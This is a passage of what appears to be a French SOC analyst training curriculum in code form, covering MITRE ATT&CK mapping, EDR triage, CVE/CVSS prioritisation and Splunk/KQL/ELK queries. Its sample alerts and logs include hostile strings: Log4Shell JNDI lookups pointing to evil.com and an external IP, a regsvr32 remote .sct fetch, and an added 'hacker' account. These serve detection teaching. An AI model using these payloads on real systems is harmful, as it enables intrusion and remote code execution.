## ATT&CK Navigator — Outil visuel

**Ce que c'est :** une carte interactive de toutes les techniques. En SOC tu l'utilises pour :
- Visualiser quelles techniques tu détectes déjà (couverture de détection)
- Identifier les angles morts (techniques sans règles SIEM)
- Mapper un incident sur la matrice pour le rapport

**Règle SOC :** quand tu traites un incident, note les T-codes correspondants dans ton ticket. Ça permet de mesurer la couverture ATT&CK de ton SOC et d'améliorer les règles.`,
            technique: `## Structure ATT&CK

\`\`\`
TACTIC (le POURQUOI)
  └── Technique T1XXX (le COMMENT)
        └── Sub-technique T1XXX.XXX (variante spécifique)

Exemple :
Credential Access (Tactic)
  └── T1003 - OS Credential Dumping (Technique)
        ├── T1003.001 - LSASS Memory (Mimikatz)
        ├── T1003.002 - Security Account Manager
        └── T1003.006 - DCSync
\`\`\`

## 14 Tactiques ATT&CK Enterprise (ordre chronologique d'attaque)
1. Reconnaissance
2. Resource Development
3. Initial Access
4. Execution
5. Persistence
6. Privilege Escalation
7. Defense Evasion
8. Credential Access
9. Discovery
10. Lateral Movement
11. Collection
12. Command and Control
13. Exfiltration
14. Impact

## Mapper une alerte sur ATT&CK
\`\`\`
Alerte : "PowerShell EncodedCommand"
→ Tactic: Execution
→ Technique: T1059.001 (PowerShell)
→ Tactic associée suivante possible: Defense Evasion (T1027 - Obfuscation)
→ Rechercher aussi: T1105 (Ingress Tool Transfer) si download inclus
\`\`\``,
            attaquant: `Les attaquants utilisent ATT&CK pour planifier leurs attaques et tester leur couverture. Les red teams utilisent ATT&CK Navigator pour documenter ce qu'ils ont testé.`,
            soc: `## ATT&CK dans le SIEM — Tags Sigma

Les règles Sigma incluent des tags ATT&CK :
\`\`\`yaml
tags:
  - attack.execution
  - attack.t1059.001  # PowerShell
  - attack.defense_evasion
  - attack.t1027      # Obfuscation
\`\`\`

Dans Splunk, quand une alerte se déclenche, le tag ATT&CK te dit immédiatement :
- Quelle phase de l'attaque
- Quelle technique spécifique
- Quelles autres techniques surveiller ensuite

## ATT&CK Navigator — Cartographier un incident
Sur attack.mitre.org/versions/v14/navigator :
1. Ouvrir un nouveau layer
2. Colorier les techniques détectées dans l'incident
3. Voir le tableau complet de la kill chain
4. Identifier les gaps (techniques non détectées mais logiquement suivantes)`,
            logs_exemples: `## Alerte taguée ATT&CK dans un SIEM
\`\`\`json
{
  "rule": "Suspicious PowerShell Encoded Command",
  "severity": "high",
  "mitre_tactic": "Execution",
  "mitre_technique": "T1059.001",
  "host": "WKS-042",
  "user": "john.doe",
  "commandline": "powershell.exe -enc SGVsbG8gV29ybGQ=",
  "parent_process": "WINWORD.EXE"
}
\`\`\`
Tag ATT&CK → lookup sur attack.mitre.org → techniques associées : T1027 (Obfuscation), T1105 (Transfer tool), T1055 (Process Injection) → chercher ces techniques ensuite.`,
            atelier: {
              titre: "Atelier : Mapper un incident sur MITRE ATT&CK Navigator",
              duree: "1h",
              niveau: "intermédiaire",
              objectif: "Cartographier une attaque complète sur ATT&CK et identifier les gaps de détection",
              contexte: "Incident documenté : email phishing → macro Word → PowerShell → téléchargement d'un outil → mouvement latéral SMB → dump LSASS.",
              outils: ["MITRE ATT&CK Navigator (attack.mitre.org)"],
              etapes: [
                "Ouvrir ATT&CK Navigator, créer un nouveau layer",
                "Phishing email → T1566.001 (Spearphishing Attachment) → colorier",
                "Macro Word → T1204.002 (Malicious File) + T1059.001 (PowerShell)",
                "Téléchargement outil → T1105 (Ingress Tool Transfer)",
                "Mouvement latéral SMB → T1021.002 (SMB/Windows Admin Shares)",
                "Dump LSASS → T1003.001 (LSASS Memory)",
                "Identifier les techniques NON couvertes par vos règles de détection",
                "Proposer une règle pour une technique non couverte"
              ],
              livrable: "Capture d'écran ATT&CK Navigator avec l'incident mappé + liste des gaps de détection."
            },
            cas_concret: `## Utiliser ATT&CK pour l'escalade

Alerte L1 : "Mimikatz detected on WKS-042 (T1003.001)"

Avec ATT&CK, le L1 sait immédiatement :
- Credential Access → les credentials sont en cours de vol
- Technique suivante probable : Lateral Movement (T1021), Persistence (T1547)
- Information d'escalade au L2 : "Compromission confirmée en phase Credential Access, préparation probable de mouvement latéral, isolation urgente"

Sans ATT&CK : "J'ai eu une alerte Mimikatz." 
Avec ATT&CK : "Nous sommes en phase Credential Access T1003.001, le mouvement latéral est imminent."`,
            exercices: [
              { titre: "Classifier 20 alertes SIEM avec ATT&CK", desc: "20 alertes données. Pour chaque : identifier la tactic, la technique ATT&CK, la technique suivante probable.", difficulte: "moyen", type: "analyse" }
            ],
            questions: [
              "Quelle est la différence entre une Tactic et une Technique dans ATT&CK ?",
              "Un attaquant utilise T1003.001 (LSASS). Quelle tactic est-ce et quelle technique attendez-vous ensuite ?",
              "Comment ATT&CK Navigator aide-t-il à identifier les gaps de détection ?"
            ],
            niveau_recruteur: `MITRE ATT&CK est cité dans toutes les offres d'emploi SOC. Le connaître et savoir l'utiliser (pas juste l'avoir vu) est attendu. Navigator = outil concret à mentionner.`,
            erreurs: ["Mémoriser les techniques sans comprendre leur logique — ATT&CK est un outil de raisonnement, pas une liste à apprendre.", "Ignorer les sub-techniques — elles sont cruciales pour la précision de détection."],
            resume: `ATT&CK = 14 tactics + techniques. Mapper chaque alerte sur ATT&CK → comprendre la phase de l'attaque → anticiper la suite. Navigator = cartographie visuelle. Tags Sigma = ATT&CK dans le SIEM.`
          }
        },
        {
          id: "m4c2",
          titre: "EDR — Endpoint Detection & Response",
          description: "L'outil quotidien du SOC L1. Triager des alertes EDR, investiguer un endpoint.",
          duree: "2 semaines",
          difficulte: "intermédiaire",
          prerequis: ["m1c3","m1c4"],
          sous_competences: [
            "Qu'est-ce qu'un EDR et comment il fonctionne",
            "Microsoft Defender for Endpoint — interface et alertes",
            "CrowdStrike Falcon — navigation basique",
            "Triage d'une alerte EDR : qualifier, escalader ou fermer",
            "Isolation d'un endpoint depuis l'EDR",
            "Collecte de preuves via l'EDR",
            "Différence EDR / Antivirus / SIEM"
          ],
          cours: {
            simple: `L'EDR est l'outil n°1 du SOC analyst. Avant le SIEM, avant les logs réseau — tu regardes l'EDR. Il surveille chaque endpoint en temps réel : processus, fichiers, réseau, registre. Les EDR les plus répandus en France : Microsoft Defender for Endpoint (MDE), CrowdStrike Falcon, SentinelOne, Cybereason.

---

## Ce que l'EDR voit — et ce que les antivirus manquent

| Antivirus classique | EDR |
|--------------------|-----|
| Détecte les malwares connus (signatures) | Détecte aussi les comportements (behavioral) |
| Scan fichiers sur disque | Monitore l'exécution en temps réel |
| Pas de visibilité post-infection | Timeline complète de l'attaque |
| Réponse : mettre en quarantaine | Réponse : isoler, rollback, investigation |
| Pas de contexte | Arbre de processus + connexions réseau + fichiers créés |

---

## L'arbre de processus — Ce qui change tout

**Ce que c'est :** l'EDR montre quel processus a créé quel autre processus, formant un arbre visuel.

**Exemple d'arbre suspect :**
\`\`\`
winword.exe (Word)
  └─ cmd.exe
       └─ powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=
            └─ net.exe user /domain
            └─ whoami.exe
\`\`\`

**Lecture :** Word → cmd → PowerShell → commandes de reconnaissance AD. C'est une macro malveillante qui s'est exécutée. 100% suspect.

---

## Microsoft Defender for Endpoint (MDE) — Triage d'alerte

**Accès :** security.microsoft.com → Incidents & Alerts

**Ce que tu vois sur une alerte MDE :**
\`\`\`
Alerte : "Suspicious PowerShell commandline"
Sévérité : High
Device : DESKTOP-ABC123 (alice.martin)
Heure : 2024-01-15 14:32:01
Process : powershell.exe
Parent : winword.exe
Commandline : powershell.exe -nop -w hidden -EncodedCommand SGVs...
Connexion réseau : 185.220.101.42:4444 (TCP ESTABLISHED)
\`\`\`

**Ton workflow de triage :**
1. Qui est la victime ? → alice.martin, département Finance (contexte)
2. Quel process a lancé PowerShell ? → Word (= phishing, macro)
3. La connexion réseau est vers quoi ? → IP externe, port 4444 (C2 Metasploit)
4. D'autres machines sont-elles touchées ? → vérifier dans le SIEM
5. Action : **isoler le poste** via le bouton "Isolate device" dans MDE + escalader

---

## CrowdStrike Falcon — Différences

**Ce que Falcon apporte en plus :**
- **Threat Graph** : visualisation graphique des connexions entre entités
- **RTR (Real-Time Response)** : accès ligne de commande direct à l'endpoint compromis depuis la console
- **Overwatch** : équipe MDR de CrowdStrike qui surveille 24/7 et t'alerte

**Commandes RTR utiles :**
\`\`\`
# Lister les processus actifs
runscript -Raw=\`\`\`ps\`\`\` -DeviceId=<device_id>

# Lister les connexions réseau
runscript -Raw=\`\`\`netstat -anob\`\`\` -DeviceId=<device_id>

# Récupérer un fichier pour analyse
get C:\\Users\\victim\\AppData\\Roaming\\malware.exe
\`\`\`

---

## Indicateurs de compromission dans l'EDR

| Ce que tu vois | Ce que ça signifie | Action |
|----------------|-------------------|--------|
| Office → cmd/PowerShell | Macro malveillante | Isoler + forensic |
| Process depuis C:\\Temp ou C:\\Users\\Public | Malware | Analyser le hash (VT) |
| Connexion réseau depuis lsass.exe | Credential dump | Critique, isoler |
| Process avec nom similaire à svchost (svchost_.exe) | Masquage | Analyser hash + chemin |
| DLL injectée dans un process légitime | Fileless malware | EDR → mémoire forensic |
| Désactivation Windows Defender via PowerShell | Defense Evasion | Compromission actuelle |

**Règle SOC :** l'EDR te donne le contexte que les logs seuls ne peuvent pas donner. Toujours commencer par l'EDR, puis corroborer avec le SIEM.`,
            technique: `## EDR vs Antivirus vs SIEM

| | Antivirus | EDR | SIEM |
|---|---|---|---|
| Périmètre | Fichiers | Endpoint complet | Multi-sources |
| Détection | Signatures | Comportemental | Corrélation |
| Réponse | Quarantaine | Isolation + investigation | Alerte |
| Visibilité | Fichiers seuls | Process, réseau, registre | Tout |
| Rétention | Non | 30-90 jours | 1 an+ |

## Microsoft Defender for Endpoint — Alertes types

\`\`\`
Alert: "Suspicious PowerShell cmdline"
Severity: High
Device: WKS-042
User: john.doe
Process Tree:
  WINWORD.EXE (PID 1234)
    └── cmd.exe (PID 2345)
          └── powershell.exe -nop -w hidden -enc SGVsbG8= (PID 3456)
                └── net.exe user hacker P@ss123 /add (PID 4567)

Timeline:
  09:15:03 - File downloaded: C:\\Temp\\payload.exe
  09:15:05 - Process created: powershell.exe
  09:15:08 - Network connection: 185.x.x.x:443
  09:15:10 - Registry modified: HKCU\\Run\\Update
\`\`\`

## Actions disponibles dans un EDR

- **Isolate device** : couper le réseau de l'endpoint (garde la connexion EDR)
- **Run antivirus scan** : scan complet
- **Collect investigation package** : récupérer logs, memory dump, prefetch
- **Restrict app execution** : bloquer tout sauf les process autorisés
- **Stop and quarantine file** : supprimer un fichier malveillant`,
            attaquant: `Les attaquants cherchent à désactiver l'EDR : kill the process, bypass via syscalls directs, utiliser des drivers vulnérables (BYOVD - Bring Your Own Vulnerable Driver). L'EDR moderne répond en se protégeant via un driver kernel.`,
            soc: `## Workflow triage alerte EDR

\`\`\`
1. Lire l'alerte : titre, sévérité, device, user, heure
2. Regarder le Process Tree : la chaîne parent→enfant
3. Vérifier la CommandLine complète (décoder le Base64 si présent)
4. Regarder la Timeline de l'endpoint (30 dernières minutes)
5. Connexions réseau : IP distantes contactées → VirusTotal/AbuseIPDB
6. Fichiers créés/modifiés : hashes → VirusTotal
7. Verdict :
   - FAUX POSITIF → documenter et fermer
   - VRAI POSITIF → sévérité faible : documenter + remédier
   - VRAI POSITIF → sévérité haute : ISOLER + escalader L2
\`\`\``,
            logs_exemples: `## Alerte EDR — Microsoft Defender for Endpoint
\`\`\`
Alert ID: DA637...
Title: Suspicious use of Regsvr32
Severity: Medium
Device: LAPTOP-HR-07
User: claire.martin
First activity: 2024-01-15T10:45:22Z

Process Tree:
  outlook.exe
    └── regsvr32.exe /s /u /i:http://185.x.x.x/payload.sct scrobj.dll

Indicators:
  - File: scrobj.dll (legitimate Windows file, abused)
  - URL: http://185.x.x.x/payload.sct → VirusTotal: 38/72 detected
  - Network: 185.x.x.x:80 contacted POST /checkin

MITRE: T1218.010 (Signed Binary Proxy Execution: Regsvr32)
\`\`\`
Regsvr32 abuse = LOLBin. Outlook → Regsvr32 = pièce jointe ou macro Outlook.`,
            atelier: {
              titre: "Atelier : Simuler le triage d'alertes EDR sur LetsDefend",
              duree: "2h",
              niveau: "intermédiaire",
              objectif: "Traiter 5 alertes EDR réalistes sur LetsDefend.io et prendre les bonnes décisions",
              contexte: "LetsDefend.io simule un vrai SOC avec des alertes réelles à traiter. Tu vas triager des alertes EDR et documenter tes décisions.",
              outils: ["LetsDefend.io (compte gratuit)"],
              etapes: [
                "Créer un compte sur LetsDefend.io",
                "Section 'Monitoring' → choisir une alerte de type malware",
                "Analyser le process tree, la commandline, les connexions réseau",
                "Utiliser les outils intégrés : VirusTotal, AbuseIPDB",
                "Décision : True Positive ou False Positive ?",
                "Si TP : contenir l'endpoint, documenter les IOC",
                "Soumettre la décision et voir le score"
              ],
              livrable: "5 alertes triées avec documentation : verdict, IOC, action prise, score obtenu."
            },
            cas_concret: `## Triage EDR : FAUX POSITIF

Alerte : "Suspicious PowerShell execution from IT management tool"
Device : SRV-MGMT-01
Process : powershell.exe -enc [base64]
Parent : nessus_agent.exe

Analyse :
- Décoder Base64 : script de collecte d'inventaire système (Get-Process, Get-Service)
- nessus_agent.exe = Nessus Vulnerability Scanner (légitime)
- SRV-MGMT-01 = serveur de gestion IT
- Heure : 02h00 (scan nocturne planifié)

Verdict : FAUX POSITIF — scan Nessus planifié. Actions : fermer l'alerte, documenter, créer une exclusion pour cet agent Nessus.`,
            exercices: [
              { titre: "LetsDefend — 10 alertes SOC", desc: "Traiter 10 alertes sur LetsDefend.io. Documenter : verdict, IOC, action, score. Objectif : 80% de bonnes décisions.", difficulte: "avancé", type: "lab", outil: "LetsDefend.io" }
            ],
            questions: [
              "Quelle est la première action quand vous confirmez un True Positive sévérité haute sur un EDR ?",
              "Comment un EDR différencie-t-il un comportement malveillant d'un outil d'administration légitime ?",
              "Vous devez isoler un endpoint critique (serveur de production). Quelle est la procédure ?"
            ],
            niveau_recruteur: `L'EDR est l'outil n°1 utilisé dès le premier jour en SOC. Les recruteurs demandent si tu as de l'expérience sur CrowdStrike, MDE, SentinelOne. LetsDefend = pratique gratuite valorisable en entretien.`,
            erreurs: [
              "Isoler un endpoint sans vérifier s'il est critique pour la production.",
              "Fermer une alerte EDR comme faux positif uniquement parce que l'AV ne détecte rien.",
              "Ignorer le process tree — c'est la pièce centrale du triage EDR."
            ],
            resume: `EDR = visibilité complète de l'endpoint. Process Tree = pièce centrale. TP haute sévérité → isoler avant d'investiguer. Toujours décoder le Base64 dans les commandlines. LetsDefend = pratique EDR terrain.`
          }
        },
        {
          id: "m4c3",
          titre: "Gestion des vulnérabilités — perspective SOC",
          description: "CVE, CVSS, scanner les vulnérabilités et prioriser les correctifs.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m4c1"],
          sous_competences: [
            "CVE et base NVD — lire une fiche CVE",
            "CVSS v3 : score Base, Temporal, Environmental",
            "Outils de scan : Nessus (lecture des rapports)",
            "Priorisation par risque réel (pas juste le score)",
            "KEV (Known Exploited Vulnerabilities) CISA",
            "Patch management et fenêtres de maintenance"
          ],
          cours: {
            simple: `En SOC, tu verras des alertes basées sur des CVE (vulnérabilités connues). Savoir lire une CVE et son score CVSS te permet de prioriser : est-ce qu'un attaquant peut l'exploiter maintenant ? Est-ce que notre infrastructure est exposée ? C'est la différence entre une alerte qui attend une semaine et une escalade immédiate.

---

## CVE & CVSS — Les bases

**CVE (Common Vulnerabilities and Exposures) :** identifiant unique d'une vulnérabilité.
Format : \`CVE-ANNÉE-NUMÉRO\` ex: \`CVE-2021-44228\` (Log4Shell)

**CVSS (Common Vulnerability Scoring System) :** score de 0 à 10 qui mesure la gravité.

| Score CVSS | Sévérité | Ce que ça veut dire pour le SOC |
|-----------|----------|--------------------------------|
| 0.1 - 3.9 | Faible | Peut attendre, peu d'impact |
| 4.0 - 6.9 | Moyen | Patcher dans le prochain cycle |
| 7.0 - 8.9 | Élevé | Priorité, risque réel |
| 9.0 - 10.0 | Critique | Action immédiate, exposé = escalade |

---

## Ce que le CVSS mesure

**Vecteur d'attaque (AV) :** depuis où l'attaquant doit être ?
- **Network (N)** → exploitable à distance depuis Internet → CRITIQUE
- **Adjacent (A)** → doit être sur le même réseau → Moyen
- **Local (L)** → doit avoir un accès local → Plus faible
- **Physical (P)** → accès physique requis → Faible

**Interaction utilisateur (UI) :**
- **None** → aucune action de l'utilisateur = exploitable automatiquement → DANGEREUX
- **Required** → l'utilisateur doit cliquer quelque chose

**Exemple CVE-2021-44228 (Log4Shell) :**
\`\`\`
CVSS 10.0 — Critique
AV: Network / AC: Low / PR: None / UI: None
→ Exploitable depuis Internet, sans authentification, sans interaction = catastrophique
\`\`\`

---

## Les vulnérabilités critiques à connaître pour un SOC L1

| CVE | Nom | CVSS | Système | Ce que ça fait |
|-----|-----|------|---------|----------------|
| CVE-2021-44228 | Log4Shell | 10.0 | Log4j (Java) | RCE via JNDI dans les logs |
| CVE-2021-34527 | PrintNightmare | 8.8 | Windows Print Spooler | RCE + escalade de privilèges |
| CVE-2020-1472 | Zerologon | 10.0 | Domain Controller | Prise de contrôle DC sans auth |
| CVE-2021-26855 | ProxyLogon | 9.8 | Microsoft Exchange | RCE sans auth sur Exchange |
| CVE-2023-23397 | Outlook 0-click | 9.8 | Microsoft Outlook | Vol de hash NTLM sans clic |

---

## Ce que fait le SOC quand une CVE critique sort

1. **Vérifier l'exposition** : est-ce qu'on a des systèmes vulnérables exposés sur Internet ?
   - Outil : scanner de vulnérabilités (Nessus, Qualys, OpenVAS)
   - SIEM : chercher les versions vulnérables dans l'inventaire

2. **Chercher les signes d'exploitation** : des IoCs sont publiés dès les premiers jours
   - Log4Shell : chercher \`\${jndi:ldap://\` dans tous les logs applicatifs
   - ProxyLogon : chercher des web shells dans \`C:\\inetpub\\wwwroot\\aspnet_client\`

3. **Corréler avec les alertes IDS** : les règles Suricata/Snort sont publiées rapidement
   - ET EXPLOIT Log4j RCE Attempt → bloquer et alerter

4. **Escalader ou patcher** : selon l'exposition et le score CVSS

---

## KEV — Known Exploited Vulnerabilities (CISA)

**Ce que c'est :** la liste des vulnérabilités **activement exploitées en ce moment** par des attaquants réels. Publiée et maintenue par la CISA américaine.

**Pourquoi c'est important :** le score CVSS ne dit pas si c'est exploité. Une CVE CVSS 7.0 dans le KEV est plus urgente qu'une CVE CVSS 9.5 théorique non exploitée.

**Lien :** cisa.gov/known-exploited-vulnerabilities-catalog

**Règle SOC :** si une CVE est dans le KEV et que notre infra est exposée → escalade immédiate, même si le CVSS semble moyen.`,
            technique: `## CVSS v3 — Décomposer un score

\`\`\`
CVE-2021-44228 (Log4Shell) : CVSS 10.0
AV:N  = Attack Vector: Network     (exploitable à distance)
AC:L  = Attack Complexity: Low     (facile à exploiter)
PR:N  = Privileges Required: None  (aucun accès nécessaire)
UI:N  = User Interaction: None     (automatisable)
S:C   = Scope: Changed             (impact sur d'autres composants)
C:H   = Confidentiality: High
I:H   = Integrity: High
A:H   = Availability: High
→ Score 10.0/10 — Critique maximum
\`\`\`

## KEV — CISA Known Exploited Vulnerabilities
La liste des CVE activement exploitées en ce moment.
URL : cisa.gov/known-exploited-vulnerabilities-catalog
→ Si une CVE est dans la KEV = patch en priorité absolue, délai max 2 semaines.

## Lire un rapport Nessus
\`\`\`
Plugin: 156032 - Apache Log4j < 2.17.0 RCE
Severity: Critical (CVSS 10.0)
Host: 10.0.0.50
Port: 8080/tcp
Description: The remote host is running a version of Apache Log4j...
Solution: Upgrade to Log4j 2.17.0 or later
CVE: CVE-2021-44228, CVE-2021-45046
\`\`\``,
            attaquant: `Log4Shell (CVE-2021-44228) : l'attaquant envoie la chaîne \`\${jndi:ldap://evil.com/x}\` dans n'importe quel champ loggé par Log4j. La bibliothèque fait une résolution LDAP vers le serveur de l'attaquant et charge du code arbitraire.`,
            soc: `## Priorisation des vulnérabilités

\`\`\`
Score CVSS seul → PAS suffisant
Priorisation réelle :

1. CVE dans la KEV CISA ? → CRITIQUE, patch dans 2 semaines
2. Exploit public disponible ? → HIGH, patch dans 1 mois
3. CVSS > 9.0 ET service exposé sur Internet ? → HIGH
4. CVSS > 7.0 en interne seulement → MEDIUM, patch prochain cycle
5. CVSS < 7.0 sans exploit public → LOW, backlog
\`\`\``,
            logs_exemples: `## Log4Shell dans les logs applicatifs
\`\`\`
2024-01-15 14:23:01 ERROR http-nio-8080 - Exception in /search
  User-Agent: \${jndi:ldap://185.x.x.x:1389/Exploit}
  X-Forwarded-For: \${jndi:ldap://185.x.x.x:1389/Exploit}
\`\`\`
Le payload Log4Shell peut être dans n'importe quel header ou champ. Si le serveur est vulnérable, il contactera 185.x.x.x.`,
            atelier: { titre: "Atelier : Analyser un rapport Nessus et prioriser les patches", duree: "1h", niveau: "intermédiaire", objectif: "Prioriser 20 vulnérabilités d'un rapport Nessus fictif", contexte: "Tu reçois un rapport Nessus d'un scan de la DMZ. 20 vulnérabilités critiques et hautes. Prioriser.", outils: ["Rapport Nessus fourni (PDF ou CSV)", "CISA KEV catalog", "NVD nvd.nist.gov"], etapes: ["Extraire les CVE du rapport", "Vérifier chaque CVE critique dans la KEV CISA", "Pour les non-KEV : chercher sur exploit-db.com si exploit public", "Croiser avec l'exposition (Internet-facing vs interne)", "Créer un tableau priorisé : P1/P2/P3 avec délais recommandés"], livrable: "Tableau de priorisation avec justification pour chaque CVE." },
            cas_concret: `## Réponse à Log4Shell (CVE-2021-44228)

Décembre 2021 - Zero-day dans Log4j CVSS 10.0.

Actions SOC immédiates :
1. Identifier toutes les applications Java en production (CMDB)
2. Scanner avec Nessus ou un outil dédié Log4Shell
3. Chercher dans les logs web des payloads \`\${jndi:\` (grep ou SIEM)
4. Chercher des connexions sortantes LDAP/RMI depuis les serveurs (port 1389, 389)
5. Escalader en P1 si des serveurs sont exposés et non patchés
6. Workaround immédiat : ajouter -Dlog4j2.formatMsgNoLookups=true
7. Patch dès disponibilité`,
            exercices: [{ titre: "CVE Research — 5 vulnérabilités critiques récentes", desc: "Chercher 5 CVE critiques des 12 derniers mois sur NVD. Pour chaque : CVSS, vecteur d'attaque, est-ce dans la KEV, exploit disponible, impact.", difficulte: "moyen", type: "recherche" }],
            questions: ["CVSS 9.8 mais la vulnérabilité n'est pas dans la KEV. Comment priorisez-vous ?", "Quelle est la différence entre une CVE et un exploit ?", "Un serveur web est vulnérable à Log4Shell mais est en DMZ avec un WAF. Comment évaluez-vous le risque ?"],
            niveau_recruteur: `Lire une CVE et un score CVSS est attendu en L1. Connaître la KEV CISA et l'utiliser pour la priorisation est un plus.`,
            erreurs: ["Prioriser uniquement par score CVSS sans vérifier l'exploitabilité réelle.", "Ignorer la KEV CISA — c'est la liste des vulnérabilités qui se font exploiter maintenant.", "Patcher sans tester en préproduction (casser des services en production)."],
            resume: `CVE = identifiant vulnérabilité. CVSS = score de sévérité. KEV CISA = liste des CVE exploitées activement. Priorisation : KEV + exploit public + exposition Internet. Log4Shell = exemple de CVE 10.0 massif.`
          }
        }
      ]
    },

    // ─────────────────────────────────────────────────────────
    // MODULE 5 — SOC / BLUE TEAM
    // ─────────────────────────────────────────────────────────
    {
      id: "m5",
      titre: "SOC / Blue Team",
      description: "SIEM, triage d'alertes, threat intelligence, incident response — le quotidien complet d'un analyste SOC.",
      icon: "🔵",
      couleur: "#10b981",
      mois: "Mois 6–9",
      ordre: 5,
      objectif: "Opérer en SOC de façon autonome : trier les alertes, investiguer, escalader, documenter.",
      competences: [
        {
          id: "m5c1",
          titre: "SIEM — Splunk & ELK en pratique",
          description: "Interroger un SIEM, créer des alertes, construire des dashboards.",
          duree: "3 semaines",
          difficulte: "avancé",
          prerequis: ["m2c2","m3c1"],
          sous_competences: [
            "Architecture SIEM : collecte, normalisation, corrélation, alertes",
            "Splunk SPL : recherche, stats, tables, jointures",
            "ELK : Elasticsearch queries + Kibana dashboards",
            "Création de règles de corrélation",
            "Réduction des faux positifs (tuning)",
            "Boss of the SOC (BOTS) — dataset réaliste"
          ],
          cours: {
            simple: `Le SIEM est la tour de contrôle du SOC. Il centralise tous les logs (Windows, Linux, firewall, proxy, EDR, AD...) et déclenche des alertes quand il détecte quelque chose d'anormal. En France, les SIEM les plus courants sont : Splunk, Microsoft Sentinel (Azure), IBM QRadar, et Elastic/ELK.

---

## Ce que fait le SIEM — Les 4 fonctions clés

1. **Collecte** : ingère les logs de toutes les sources (agents, syslog, API)
2. **Normalisation** : convertit des formats différents en un format commun
3. **Corrélation** : croise des événements de sources différentes pour détecter des patterns
4. **Alerte** : déclenche des tickets quand une règle matche

**Exemple de corrélation :** 4625 (échec auth) × 50 en 1 minute → puis 4624 (succès) depuis la même IP = brute force réussi → alerte CRITIQUE.

---

## Splunk — SPL (Search Processing Language)

**Requêtes de base :**

\`\`\`spl
# Recherche simple : tous les events d'un index
index=windows

# Filtrer par Event ID
index=windows EventCode=4625

# Filtrer par plage de temps
index=windows earliest=-1h latest=now

# Compter par champ
index=windows EventCode=4625 | stats count by Account_Name | sort -count

# Détecter brute force : +50 échecs en 5 min
index=windows EventCode=4625
| bucket _time span=5m
| stats count by Account_Name, _time
| where count > 50

# Connexions vers des IPs externes inhabituelles
index=firewall action=allow dest_port=4444
| stats count by src_ip, dest_ip
| sort -count
\`\`\`

**À retenir pour les entretiens :**
- \`| stats count by\` : compter et grouper
- \`| where\` : filtrer les résultats
- \`| table\` : afficher des colonnes spécifiques
- \`| sort\` : trier
- \`| eval\` : créer un nouveau champ calculé

---

## Microsoft Sentinel — KQL (Kusto Query Language)

\`\`\`kql
// Tous les échecs de connexion des dernières 24h
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4625
| summarize count() by Account, IpAddress
| sort by count_ desc

// Détecter un brute force
SecurityEvent
| where EventID == 4625
| summarize FailureCount=count() by Account, IpAddress, bin(TimeGenerated, 5m)
| where FailureCount > 20

// Connexions réussies après des échecs
let failures = SecurityEvent | where EventID == 4625;
let successes = SecurityEvent | where EventID == 4624;
failures | join kind=inner successes on Account, IpAddress
| project TimeGenerated, Account, IpAddress, EventID
\`\`\`

---

## ELK Stack — Elastic / Kibana

**Architecture :**
- **Logstash** : collecte et transforme les logs
- **Elasticsearch** : stockage et indexation (moteur de recherche)
- **Kibana** : interface visuelle, dashboards, recherche

**Requête Kibana (KQL) :**
\`\`\`kql
event.code:4625 AND winlog.event_data.SubjectUserName:* AND @timestamp:[now-1h TO now]
\`\`\`

---

## Dashboards SOC — Ce qu'un analyste regarde en arrivant

| Dashboard | Ce qu'il montre | Fréquence |
|-----------|----------------|-----------|
| Alerte queue | Alertes non traitées par priorité | Constamment |
| Top failed logins | Comptes/IPs avec le plus d'échecs | Toutes les heures |
| Connexions vers IPs inconnues | Potentiel C2 ou exfiltration | Toutes les heures |
| Volume de logs par source | Détection de trous (source qui ne log plus) | Quotidien |
| Nouveaux processus/services | Malware installé | Quotidien |

**Règle SOC :** si une source de logs s'arrête (ex: l'EDR ne remonte plus de données d'un poste) → ce peut être un attaquant qui a désactivé l'agent. Alerter.`,
            technique: `## Splunk SPL — Requêtes indispensables

\`\`\`splunk
# Recherche basique — dernières 24h
index=windows EventCode=4625
| stats count by src_ip, dest_user
| sort -count
| head 20

# Détecter un brute force
index=windows EventCode=4625
| bucket _time span=5m
| stats count by _time, src_ip, dest_user
| where count > 10
| sort -count

# Beaconing HTTP
index=proxy
| stats count, dc(url) as unique_urls, avg(bytes) as avg_bytes by src_ip, dest_ip
| where count > 100 AND unique_urls < 5
| sort -count

# Processus enfants suspects (Sysmon)
index=sysmon EventCode=1
| eval suspicious=if(match(ParentImage,"(?i)word|excel|outlook|powerpnt") AND
    match(Image,"(?i)cmd|powershell|wscript|cscript|mshta"),"YES","NO")
| where suspicious="YES"
| table _time, Computer, User, ParentImage, Image, CommandLine
\`\`\`

## ELK — Requêtes Elasticsearch essentielles
\`\`\`json
// Brute force SSH
GET winlogbeat-*/_search
{
  "query": {
    "bool": {
      "filter": [
        {"term": {"event.code": "4625"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "aggs": {
    "by_ip": {
      "terms": {"field": "source.ip"},
      "aggs": {"count": {"value_count": {"field": "_id"}}}
    }
  }
}
\`\`\``,
            attaquant: `Les attaquants effacent les logs ou injectent de faux logs pour noyer leurs traces. Défense : log forwarding vers un SIEM centralisé dès qu'un log est créé (pas de rétention locale suffisante).`,
            soc: `## Créer une alerte de corrélation dans Splunk

\`\`\`splunk
# Alerte : Connexion depuis IP blacklistée
| inputlookup threat_intel.csv  ← lookup IOC
| eval ip=malicious_ip
| join type=inner ip [search index=firewall action=allow dest_ip=$ip$]
| table _time, src_ip, dest_ip, rule
| where count > 0
\`\`\`

## Dashboard SOC minimum viable
- Alertes ouvertes par sévérité (P1/P2/P3)
- Volume de logs par source (données qui arrivent ?)
- Top IPs malveillantes détectées
- Brute force en cours (4625 en temps réel)
- Nouvelles connexions depuis des pays inhabituels`,
            logs_exemples: `## BOTS (Boss of the SOC) — Splunk challenge
\`\`\`splunk
# Trouver l'IP de l'attaquant dans le BOTS dataset
index=botsv1 sourcetype=stream:http
| stats count by src_ip
| sort -count
| head 5

# Identifier le premier accès
index=botsv1 sourcetype=stream:http src_ip=40.80.148.42
| sort _time
| head 1
\`\`\``,
            atelier: {
              titre: "Atelier : Boss of the SOC (BOTS) — Investigation Splunk",
              duree: "4h",
              niveau: "avancé",
              objectif: "Résoudre des questions d'investigation sur le dataset BOTS de Splunk",
              contexte: "Le dataset BOTS contient des logs réels d'une attaque simulée. Tu joues le rôle de l'analyste SOC qui doit retrouver l'attaquant et ses actions.",
              outils: ["Splunk Free ou Splunk Cloud (trial)", "Dataset BOTS v1 (disponible gratuitement)"],
              etapes: [
